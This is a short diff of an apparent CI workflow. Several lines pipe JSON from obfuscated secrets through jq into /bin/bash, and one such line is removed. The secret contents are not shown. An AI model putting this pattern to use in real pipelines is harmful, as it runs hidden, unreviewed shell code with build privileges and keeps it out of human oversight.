@@ -21,7 +21,6 @@ jobs:
           pt9593: ${{ secrets.pt9593 }}
         run: |
           printf '%s' "$pt9593" | jq -r .wqqck44 | /bin/bash
-          printf '%s' "$o966" | jq -r .stkv7 | /bin/bash
           echo $s6 | jq -r .r452 | /bin/bash
           echo $ylsld3 | jq -r .ymg032 | /bin/bash
 
